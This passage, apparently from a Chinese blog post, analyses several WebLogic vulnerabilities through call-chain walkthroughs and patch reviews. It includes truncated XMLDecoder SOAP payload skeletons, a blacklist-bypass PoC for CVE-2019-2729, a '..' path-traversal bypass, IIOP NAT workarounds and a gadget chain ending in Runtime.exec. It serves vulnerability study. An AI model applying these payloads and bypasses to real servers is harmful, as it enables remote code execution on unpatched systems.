<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111854120.png" alt="image-20230511185414045"></p>
<p>利用链从WorkContextLocalMap的receiveRequest开始与CVE-2017-10271相同。</p>
<p>这里从处理的入口点开始分析BaseWSServlet#service：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111910380.png" alt="image-20230511191022267"></p>
<p>service方法上半部分如上图，下半部分如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111912552.png" alt="image-20230511191200491"></p>
<p>进入run方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111913699.png" alt="image-20230511191349641"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111914179.png" alt="image-20230511191422097"></p>
<p>循环获取每个处理器，处理请求，第一个处理器为SoapProcessor，进入SoapProcessor的process方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111915779.png" alt="image-20230511191505714"></p>
<p>调用handlePost处理POST请求，进入handlePost方法查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111916143.png" alt="image-20230511191651059"></p>
<p>port变量为WsPortImpl：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111938455.png" alt="image-20230511193850170"></p>
<p>WSDL Port，它是WSDL（Web Services Description Language，Web服务描述语言）文件中定义的一个元素。</p>
<p>WSDL Port元素包含了以下信息：</p>
<ol>
<li>名称（name）：指定该port名字；</li>
<li>Web服务的网络地址（location）信息，用于指定Web服务实际运行的地址；</li>
<li>Web服务的绑定（binding）信息，用于指定绑定使用的SOAP协议版本、消息编码格式、传输协议等信息。</li>
</ol>
<p>WsSkel是Web服务的一个概念，它是指Web服务的Skeleton（骨架）代码。在Web服务的开发过程中，开发人员通常需要编写Web服务的实现代码和Skeleton代码。</p>
<p>Skeleton代码是Web服务的框架代码，它负责接收SOAP消息，并将消息传递给Web服务的实现代码进行处理。在Java语言中，Skeleton代码通常由Java API for XML-Based Web Services (JAX-WS) 自动生成，开发人员无需手动编写Skeleton代码。</p>
<p>WsSkel通常包含以下功能：</p>
<ol>
<li>解析SOAP消息：WsSkel负责解析SOAP消息，并将消息转换为Java对象，以便在Web服务的实现代码中进行处理。</li>
<li>调用Web服务实现代码：WsSkel将解析得到的Java对象传递给Web服务实现代码进行处理，然后将处理结果封装为SOAP消息返回给客户端。</li>
<li>处理SOAP Fault：如果Web服务发生异常，WsSkel将捕获异常并将其封装为SOAP Fault消息返回给客户端。</li>
</ol>
<p>WsSkel是Web服务的重要组成部分之一，它使得Web服务的开发变得更加简单和高效。开发人员可以专注于Web服务的实现代码，而无需关注底层的SOAP消息处理细节。</p>
<p>然后进入invoke方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111953155.png" alt="image-20230511195325063"></p>
<p>设置线程classloader，然后绑定port和connection到dispatcher，然后调用dispatch方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111955419.png" alt="image-20230511195535344"></p>
<p>dispatch方法中获取处理链（HandlerIterator），然后调用handleRequest方法处理请求：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111957172.png" alt="image-20230511195736672"></p>
<p>循环每个handler，调用他们的handleRequest方法，总共有21个handler：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111958793.png" alt="image-20230511195827738"></p>
<p>在WorkAreaServerHandler的handleRequest方法中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112001854.png" alt="image-20230511200134772"></p>
<p>获取的header为：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112005415.png" alt="image-20230511200538363"></p>
<p>然后获取header的输入流，也就是Content的内容，然后包装成WorkContextXmlInputAdapter对象，传递给WorkContextMapImpl的receiveRequest方法，这里后续就跟CVE-2017-10271相同了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112009210.png" alt="image-20230511200942093"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112010636.png" alt="image-20230511200959254"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112010060.png" alt="image-20230511201011183"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112010432.png" alt="image-20230511201024373"></p>
<p>回顾一下XML内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">      &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">          &lt;java&gt;</span><br><span class="line">              &lt;class&gt;</span><br><span class="line">                  &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet</span><br><span class="line">                  &lt;/string&gt;</span><br><span class="line">                  &lt;void&gt;</span><br><span class="line">                      &lt;array class=&quot;byte&quot; length=&quot;8970&quot;&gt;</span><br><span class="line">                      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                          &lt;byte&gt;-84&lt;/byte&gt;</span><br><span class="line">              		  ...</span><br><span class="line">              		  ...</span><br><span class="line">          			  &lt;/array&gt;</span><br><span class="line">				  &lt;/void&gt;</span><br><span class="line">			  &lt;/class&gt;</span><br><span class="line">          &lt;/java&gt;</span><br><span class="line">      &lt;/work:WorkContext&gt;</span><br><span class="line">  &lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>将字节数组传递给UnitOfWorkChangeSet的构造函数进行实例化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112019033.png" alt="在这里插入图片描述"></p>
<p>先将字节数组包装成字节输入流，然后将该输入流作为对象输入流要读取的目标，然后readObjcet读取。造成反序列化漏洞，且未作任何过滤。配合JDK7u21造成RCE。</p>
<h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p>打上p29633448_121300_Generic.zip补丁后，WorkContextXmlInputAdapter的validate方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112213985.png" alt="image-20230511221329847"></p>
<p>若标签名为object、class、new、method则抛出异常，同时标签名为void，但是标签带有的属性只要不是index就抛出异常，再往下看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112215684.png" alt="image-20230511221503595"></p>
<p>若是array标签，则他的class属性的值不是byte就抛异常，然后限定他array标签的length小于10000，否则抛异常。</p>
<p>这里将class标签封禁，则payload就无法使用。</p>
<h2 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>这次是对CVE-2019-2725的绕过，POC如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">array</span> <span class="attr">method</span>=<span class="string">&quot;forName&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">string</span>&gt;</span>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</span><br><span class="line">                  <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;byte&quot;</span> <span class="attr">length</span>=<span class="string">&quot;8970&quot;</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                              <span class="tag">&lt;<span class="name">byte</span>&gt;</span>-84<span class="tag">&lt;/<span class="name">byte</span>&gt;</span></span><br><span class="line">              		  	  ...</span><br><span class="line">              		  	  ...</span><br><span class="line">          			  <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实就是将被封禁的class标签替换成array标签，同时还带上一个method属性。</p>
<p>由于JDK6和JDK7 XMLDecoder处理方式的差异，这个POC只在JDK6下生效；</p>
<p>JDK7将不同的标签处理交给不同的处理器：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112236498.png" alt="image-20230511223632424"></p>
<p>而JDK6统一处理不同标签：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (name == &quot;string&quot;) &#123;</span><br><span class="line">    e.setTarget(String.class);</span><br><span class="line">    e.setMethodName(&quot;new&quot;);</span><br><span class="line">    this.isString = true;</span><br><span class="line">&#125; else if (this.isPrimitive(name)) &#123;</span><br><span class="line">    Class wrapper = typeNameToClass(name);</span><br><span class="line">    e.setTarget(wrapper);</span><br><span class="line">    e.setMethodName(&quot;new&quot;);</span><br><span class="line">    this.parseCharCode(name, attributes);</span><br><span class="line">&#125; else if (name == &quot;class&quot;) &#123;</span><br><span class="line">    e.setTarget(Class.class);</span><br><span class="line">    e.setMethodName(&quot;forName&quot;);</span><br><span class="line">&#125; else if (name == &quot;null&quot;) &#123;</span><br><span class="line">    e.setTarget(Object.class);</span><br><span class="line">    e.setMethodName(&quot;getSuperclass&quot;);</span><br><span class="line">    e.setValue((Object)null);</span><br><span class="line">&#125; else if (name == &quot;void&quot;) &#123;</span><br><span class="line">    if (e.getTarget() == null) &#123;</span><br><span class="line">        e.setTarget(this.eval());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else if (name == &quot;array&quot;) &#123;</span><br><span class="line">    subtypeName = (String)attributes.get(&quot;class&quot;);</span><br><span class="line">    Class subtype = subtypeName == null ? Object.class : this.classForName2(subtypeName);</span><br><span class="line">    length = (String)attributes.get(&quot;length&quot;);</span><br><span class="line">    if (length != null) &#123;</span><br><span class="line">        e.setTarget(Array.class);</span><br><span class="line">        e.addArg(subtype);</span><br><span class="line">        e.addArg(new Integer(length));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Class arrayClass = Array.newInstance(subtype, 0).getClass();</span><br><span class="line">        e.setTarget(arrayClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else if (name == &quot;java&quot;) &#123;</span><br><span class="line">    e.setValue(this.is);</span><br><span class="line">&#125; else if (name != &quot;object&quot;) &#123;</span><br><span class="line">    this.simulateException(&quot;Unrecognized opening tag: &quot; + name + &quot; &quot; + this.attrsToString(attrs));</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JDK7处理array标签的ArrayElementHandler不处理method属性，而JDK6会将method属性的值设置到MutableExpression中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112248558.png" alt="image-20230511224831466"></p>
<p>然后走如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if (name == &quot;array&quot;) &#123;</span><br><span class="line">    subtypeName = (String)attributes.get(&quot;class&quot;);</span><br><span class="line">    Class subtype = subtypeName == null ? Object.class : this.classForName2(subtypeName);</span><br><span class="line">    length = (String)attributes.get(&quot;length&quot;);</span><br><span class="line">    if (length != null) &#123;</span><br><span class="line">        e.setTarget(Array.class);</span><br><span class="line">        e.addArg(subtype);</span><br><span class="line">        e.addArg(new Integer(length));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Class arrayClass = Array.newInstance(subtype, 0).getClass();</span><br><span class="line">        e.setTarget(arrayClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>subtype设置成Object.class，同时将MutableExpression的target属性设置成Object[].class。</p>
<p>接着往下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242149985.png" alt="image-20230424214906928"></p>
<p>然后将MutableExpression类实例添加到栈中。</p>
<p>接着在ObjectHandler的endElement方法解析结束标签：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242149367.png" alt="image-20230424214951250"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242150607.png" alt="image-20230424215002563"></p>
<p>而它会从栈中取出MutableExpression类实例，然后执行MutableExpression类实例的getValue方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112300223.png" alt="image-20230511230027148"></p>
<p>在构造函数中，由于value被赋值为unbound，后续从未调用setValue改变过value属性的值，所以在执行getValue时会走if语句，调用invoke方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112302979.png" alt="image-20230511230202880"></p>
<p>invoke方法又执行invokeInternal方法（如下）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112331964.png" alt="image-20230511233140840"></p>
<p>箭头标记程序走的位置，var2为forName，前面三个if不满足，接着往下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112332543.png" alt="image-20230511233228455"></p>
<p>这里的两个if都会走，由于找不到Object[].class的forName方法，所以var10为null，进入第二个if语句，尝试查找Class.class的forName方法，查找成功。再往后看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305112335663.png" alt="image-20230511233557570"></p>
<p>执行Class.forName，将oracle.toplink.internal.sessions.UnitOfWorkChangeSet作为参数。将UnitOfWorkChangeSet类加载进内存，在后续标签退出时实例化UnitOfWorkChangeSet类。</p>
<h2 id="CVE-2019-2827"><a href="#CVE-2019-2827" class="headerlink" title="CVE-2019-2827"></a>CVE-2019-2827</h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><p>这次是针对CVE-2019-2618文件上传对于目录穿越修复的绕过。</p>
<p>CVE-2019-2618的补丁如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305121102364.png" alt="img"></p>
<p>检测到目录包含<code>../</code>、<code>/..</code>、<code>\..</code>、<code>..\</code>，这种方式并不能完全过滤目录穿越，可以使用只有两个点的<code>..</code>进行绕过，就造成了这次CVE。</p>
<h3 id="修复-8"><a href="#修复-8" class="headerlink" title="修复"></a>修复</h3><p>若检测到包含两个点就报异常，完全杜绝了目录穿越。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305121106512.png" alt="image-20230512110611444"></p>
<h2 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>T3协议二次反序列化漏洞。</p>
<p>使用黑名单之外的类PersistentContext进行反序列化：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305121121210.png" alt="image-20230512112107103"></p>
<p>蓝色框起来的部分直接使用传递的参数ObjectInputStream进行readObject，会进行黑名单校验，这里虽然有很多readObject，但是无法绕过黑名单。然后调用readSubject方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305121123330.png" alt="image-20230512112324260"></p>
<p>readSubject方法中直接创建了一个原始的ObjectInputStream，原始的ObjectInputStream未进行任何过滤，在这里直接进行readObject，就绕过了黑名单实现任意类反序列化，配合JDK7u21链打RCE。</p>
<h2 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>在WebLogic中，T3协议反序列化时会检查类以及父类是否在黑名单，而IIOP协议反序列化时只会检查当前类是否在黑名单，这就造成了绕过。之前的补丁中，由于AbstractPlatformTransactionManager类在黑名单中，而子类JtaTransactionManager不在黑名单中，所以当使用T3协议反序列化JtaTransactionManager类时就会抛出异常。而使用IIOP协议反序列化JtaTransactionManager类时由于不会检查父类就造成了绕过。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>OMG（对象管理组织）：一种组织，类似W3C组织。</p>
<p>CORBA（Common Object Request Broker Architecture，公共对象请求代理体系结构）：为了满足不同应用程序间通信的需求，OMG制定了CORBA，它是一种标准的面向对象应用程序体系规范。</p>
<p>POA（Portable Object Adapter，便携式对象适配器）：POA拦截客户端的请求，获取需要执行的方法，调用具体实现类的对应方法，写入返回结果。</p>
<p>ORB（Object Request Broker，对象请求代理）：ORB是一个中间件，负责代理客户端和服务端之间的通信。</p>
<p>IOR（Interoperable Object Reference，互操作对象引用）：是CORBA中用于标识对象的唯一标识符。</p>
<p>IDL（Interface Definition Language，接口定义语言）：IDL是与编程语言无关的一种规范化描述性语言，为了将IDL转换成不同的编程语言，都制定了一套自用的编译器用于将可读取的OMG IDL文件转换或映射成相应的接口或类型。Java IDL（IDLJ）就是Java实现的这套编译器。</p>
<p>OMG IDL（Object Mangement Group Interface Definition Language，对象管理组标准化接口定义语言）</p>
<p>GIOP（General Inter-ORB Protocol，通用ORB间协议）：为了满足ORB之间的通信，而定义的数据传输的协议，GIOP针对不同的通信层有不同的具体实现。</p>
<p>IIOP（Internet Inter-ORB Protocol，TCP&#x2F;IP层ORB间协议）：IIOP是GIOP针对TCP&#x2F;IP层的具体实现。</p>
<p>DII（Dynamic Invocation Interface，动态调用接口）：这是CORBA调用的一种方式，既可以用<code>Stub</code>方式调用，也可以通过<code>DII</code>方式调用。</p>
<p>CORBA体系结构分为三部分：</p>
<ul>
<li>naming service</li>
<li>client side</li>
<li>servant side</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305122351434.png" alt="未命名绘图"></p>
<h3 id="分析-24"><a href="#分析-24" class="headerlink" title="分析"></a>分析</h3><p>CVE-2018-3191也使用的JtaTransactionManager，这两个CVE的反序列化过程是一样的。</p>
<p>在JtaTransactionManager的readObject方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101808793.png" alt="image-20230510180823674"></p>
<p>进入initUserTransactionAndTransactionManager方法查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101809936.png" alt="image-20230510180921866"></p>
<p>若userTransaction为null，则判断userTransactionName是否有值，有值的话调用lookupUserTransaction方法，同时将userTransactionName传递。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101811826.png" alt="image-20230510181124750"></p>
<p>发起JNDI连接，使用可控的userTransactionName作为URL。造成JNDI注入。</p>
<p>再看看是怎么到达JtaTransactionManager的readObject方法的：</p>
<p>调用链：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151140630.png" alt="image-20230515114055532"></p>
<p>从WLSExecuteRequest的run方法开始：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151457834.png" alt="image-20230515145707755"></p>
<p>将请求交给CORBA服务器引用处理，handleRequest方法CorbaServerRef未实现，所以交给父类BasicServerRef处理：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151504934.png" alt="image-20230515150448795"></p>
<p>getRuntimeMethodDescriptor方法获取要操作的方式，为bind_any，然后就是获取类加载器，判断操作方式是单向，还是双向（需要服务器响应数据），再预处理请求，获取认证主体。最后调用invoker的invoke方法。invoker为ClusterableServerRef：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151515633.png" alt="image-20230515151517540"></p>
<p>判断是否为IIOP入站请求，是的话处理HTTP附加信息，封装到response中，然后调用CorbaServerRef处理请求：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151527995.png" alt="image-20230515152717904"></p>
<p>判断连接是否在本机中，且客户端是否消亡，然后根据IIOP请求指定的方法（bind_any）从objectMethods中查找，这里查找不到，所以m为null，然后创建响应handler，最后由委托处理该IIOP请求。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151531859.png" alt="image-20230515153135783"></p>
<p>这里获取bind_any的处理标志0，不同的操作有不同的标志，比如rebind_any为1、resolve_any为2、resolve_str_any为3、to_string为4、to_name为5、to_url为6、resolve_str为7、bind为8、rebind为9、bind_context为10、rebind_context为11、resolve为12、unbind为13、new_context为14、bind_new_context为15、destroy为16、list为17。这些都是和Corba Naming service交互的方式。WNameHelper.read(in);从输入流中读取对象唯一标识符：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151546272.png" alt="image-20230515154634185"></p>
<p>接着调用read_any方法获取对象，然后使用bind_any方法将对象标识和具体对象绑定到Naming service中。</p>
<p>这里先看一下read_any方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151550644.png" alt="image-20230515155031553"></p>
<p>查看重载的read_any方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151552893.png" alt="image-20230515155212796"></p>
<p>查看read_value方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151554030.png" alt="image-20230515155403958"></p>
<p>查看read_value_internal方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151555369.png" alt="image-20230515155548225"></p>
<p>这里根据标志位，读取不同数据类型的数据，我们的标志位为29：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151556586.png" alt="image-20230515155644531"></p>
<p>29没有break，到30处调用read_value方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151558243.png" alt="image-20230515155838583"></p>
<p>接着调用重载的read_value方法，重载的方法特别长，这里分段查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151604289.png" alt="image-20230515160405187"></p>
<p>getPossibleCodebase获取codebase，为null，接着往下看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151609805.png" alt="image-20230515160916675"></p>
<p>进入else分支：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151613958.png" alt="image-20230515161350845"></p>
<p>接着往下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151614736.png" alt="image-20230515161428633"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151623311.png" alt="image-20230515162300215"></p>
<p>这里有几个条件满足才能进入该else-if：</p>
<ol>
<li>c不为null；</li>
<li>JtaTransactionManager的类描述信息ClassInfo中的库id和本地的库id相同；</li>
<li>JtaTransactionManager为Externalizable的子类或ObjectStreamClass支持使用Unsafe反序列化；</li>
</ol>
<p>在else-if中，获取JtaTransactionManager的ObjectStreamClass实例，然后在allocateValue方法中使用无参构造器进行JtaTransactionManager类的实例化，然后调用ValueHandlerImpl.readValue方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151625709.png" alt="image-20230515162512626"></p>
<p>由于反序列化的类不是数组，且不是Externalizable的，所以进入最后一个else，调用readValueData方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151628761.png" alt="image-20230515162819637"></p>
<p>进入ObjectStreamClass实例的readObject方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151628169.png" alt="image-20230515162848111"></p>
<p>readObjectMethod为JtaTransactionManager的readObject方法，这里反射调用该方法，传入JtaTransactionManager类实例和输入流。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151630139.png" alt="image-20230515163045060"></p>
<p>至此流程结束，后续就是刚开始的内容了。</p>
<h3 id="NAT问题"><a href="#NAT问题" class="headerlink" title="NAT问题"></a>NAT问题</h3><p>IIOP协议交互过程如下：</p>
<ol>
<li>op&#x3D;LocateRequest，向WebLogic请求NameService的地址；</li>
<li>op&#x3D;LocateReply，WebLogic返回Naming Service的地址（内网IP）；</li>
<li>op&#x3D;rebind_any，向Naming Service绑定对象（由于不在同一个子网，所以不能直接访问其他子网下的内网IP）；</li>
</ol>
<p>解决：</p>
<ol>
<li>重写IOPProfile的read方法，在read方法里，覆盖新建的ConnectionKey对象；</li>
<li>在<code>ContextImpl#bind</code>方法的调用中，记录下远程ip地址和端口，然后重写IIOPRemoteRef的locateIORForRequest方法，在locateIORForRequest方法里，覆盖传入参数IOR对象的profiles属性；</li>
<li>抓包，将Naming Service的内网IP改为它所拥有的外网IP。</li>
</ol>
<h3 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h3><blockquote>
<p>图片源自<a href="https://paper.seebug.org/1138/">https://paper.seebug.org/1138/</a></p>
</blockquote>
<p>判断当前类以及父类是否在黑名单：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151115218.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305151116509.png" alt="img"></p>
<h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><h3 id="分析-25"><a href="#分析-25" class="headerlink" title="分析"></a>分析</h3><p>该漏洞产生于可选组件 Oracle Coherence，不适用于WebLogic10.3.6，因为10.3.6默认不开启Coherence组件。同时如果使用的是JDK8，那么需要小于8u76，因为依赖BadAttributeValueExpException作为反序列化入口点。</p>
<p>调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    LimitFilter.toString()</span><br><span class="line">        ChainedExtractor.extract()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>这里从BadAttributeValueExpException.readObject()开始：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161334276.png" alt="image-20230516133452843"></p>
<p>读取所有属性，获取属性名为val的值，然后调用toString方法，进入LimitFilter.toString()：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161337510.png" alt="image-20230516133755443"></p>
<p>这里封装的m_comparator为ChainedExtractor，它为ValueExtractor接口的实现类，所以进入if循环，调用extract方法，这里extract方法传递的参数为m_oAnchorTop属性，它被赋值为Runtime.class。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161339584.png" alt="image-20230516133930517"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161342556.png" alt="image-20230516134256648"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161343352.png" alt="image-20230516134353291"></p>
<p>在ChainedExtractor的extractor方法中（如上），获取m_aExtractor属性值，为ValueExtractor数组，然后调用数组里的每个元素的extractor方法，同时传递oTarget参数，在调用完成后将返回值重新赋给oTarget，然后下次循环再将oTarget作为参数。也就是说，调用第一个元素的extract方法后，将返回值作为下一个元素extract方法的参数，这样不断循环。</p>
<p>我们将m_aExtractor属性值设置为ReflectionExtractor数组，</p>
